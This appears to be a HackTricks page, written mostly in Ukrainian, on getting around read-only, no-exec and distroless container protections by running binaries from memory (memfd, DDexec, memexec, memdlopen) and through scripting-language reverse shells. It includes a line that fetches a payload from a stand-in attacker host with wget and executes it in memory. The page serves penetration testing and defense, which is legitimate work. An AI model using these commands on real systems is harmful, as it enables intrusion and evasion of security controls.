# Bypass FS protections: read-only / no-exec / Distroless

{{#include ../../../banners/hacktricks-training.md}}


## Відео

У наведених відео ви можете знайти техніки, згадані на цій сторінці, пояснені детальніше:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## read-only / no-exec scenario

Стає дедалі частіше знаходити linux-машини зі змонтованою файловою системою з захистом **read-only (ro)**, особливо в контейнерах. Це тому, що запустити контейнер з ro файловою системою так само просто, як встановити **`readOnlyRootFilesystem: true`** у `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Однак навіть якщо файлова система змонтована як ro, **`/dev/shm`** усе одно буде доступна для запису, тож твердження, що ми не можемо нічого записати на диск, — не зовсім вірне. Проте ця папка буде **змонтована з no-exec захистом**, тож якщо ви завантажите сюди binary, ви **не зможете його виконати**.

> [!WARNING]
> З погляду red team, це ускладнює **завантаження та виконання** binary, які ще не присутні в системі (наприклад backdoors o enumerators як `kubectl`).

## Easiest bypass: Scripts

Зверніть увагу, що я згадував binaries: ви можете **виконувати будь-який скрипт**, якщо інтерпретатор присутній у машині, наприклад **shell script**, якщо є `sh`, або **python** **script**, якщо встановлено `python`.

Однак цього недостатньо, щоб виконати ваш binary backdoor або інші binary інструменти, які можуть знадобитися.

## Memory Bypasses

Якщо ви хочете виконати binary, але файлова система цього не дозволяє, найкращий спосіб — **запустити його з пам'яті**, оскільки **захисти там не застосовуються**.

### FD + exec syscall bypass

Якщо у машині є потужні скриптові рушії, такі як **Python**, **Perl**, або **Ruby**, ви можете завантажити binary для виконання з пам'яті, зберегти його у файловому дескрипторі в пам'яті (`create_memfd` syscall), який не підпадатиме під ці захисти, а потім викликати **`exec` syscall**, вказавши **fd як файл для виконання**.

Для цього можна легко використати проект [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Ви можете передати йому binary, і він згенерує скрипт на вказаній мові з **binary стисненим і b64 закодованим** з інструкціями для **декодування й розпаковування** в **fd**, створений викликом `create_memfd` syscall, та викликом `exec` syscall для його запуску.

> [!WARNING]
> Це не працює в інших скриптових мовах, таких як PHP або Node, тому що вони не мають ніякого d**efault way to call raw syscalls** з скрипта, тож неможливо викликати `create_memfd` для створення **memory fd** для збереження binary.
>
> Крім того, створення **звичайного fd** з файлом у `/dev/shm` не спрацює, оскільки запуск буде заборонено через дію **no-exec protection**.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) — це техніка, що дозволяє **змінювати пам'ять власного процесу** шляхом перезапису його **`/proc/self/mem`**.

Отже, контролюючи **assembly code**, який виконується процесом, ви можете записати **shellcode** та «мутувати» процес, щоб **виконати будь-який довільний код**.

> [!TIP]
> **DDexec / EverythingExec** дозволяє завантажити та **виконати** ваш власний **shellcode** або **any binary** з **memory**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Для додаткової інформації про цю техніку перевірте Github або:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) є природним наступним кроком після DDexec. Це **DDexec shellcode demonised**, тож щоразу, коли ви хочете **run a different binary**, вам не потрібно перезапускати DDexec — ви можете просто запустити memexec shellcode через техніку DDexec і потім **communicate with this deamon to pass new binaries to load and run**.

Приклад того, як використовувати **memexec to execute binaries from a PHP reverse shell**, можна знайти за адресою [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Зі схожою метою до DDexec, [**memdlopen**](https://github.com/arget13/memdlopen) дозволяє **easier way to load binaries** в пам'ять для подальшого виконання. Це навіть може дозволити завантажувати бінарники з dependencies.

## Distroless Bypass

Для детального пояснення того, **what distroless actually is**, коли він допомагає, коли ні, і як це змінює post-exploitation tradecraft у контейнерах, перегляньте:

{{#ref}}
../../privilege-escalation/container-security/distroless.md
{{#endref}}

### What is distroless

Контейнери distroless містять лише **bare minimum components necessary to run a specific application or service**, такі як бібліотеки та runtime dependencies, але виключають більші компоненти на кшталт package manager, shell або system utilities.

Мета distroless — **reduce the attack surface of containers by eliminating unnecessary components** та мінімізувати кількість вразливостей, яких можна було б використати.

### Reverse Shell

У distroless контейнері ви можете **not even find `sh` or `bash`** щоб отримати звичайну оболонку. Також ви не знайдете бінарники, такі як `ls`, `whoami`, `id`... все, що зазвичай запускаєте в системі.

> [!WARNING]
> Отже, ви не зможете отримати **reverse shell** або **enumerate** систему так, як зазвичай.

Однак, якщо скомпрометований контейнер, наприклад, запускає flask веб, то python встановлено, і тому ви можете отримати **Python reverse shell**. Якщо він запускає node, можна отримати Node rev shell, і те саме стосується більшості **scripting language**.

> [!TIP]
> Використовуючи **scripting language**, ви можете **enumerate the system** за допомогою вбудованих можливостей мови.

Якщо немає **no `read-only/no-exec`** protections, ви можете використати свій reverse shell, щоб **write in the file system your binaries** і **execute** їх.

> [!TIP]
> Однак у такого роду контейнерах ці захисти зазвичай існують, але ви можете використовувати **previous memory execution techniques to bypass them**.

Приклади того, як **exploit some RCE vulnerabilities** щоб отримати scripting languages **reverse shells** і виконувати бінарники з пам'яті, можна знайти в [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../banners/hacktricks-training.md}}
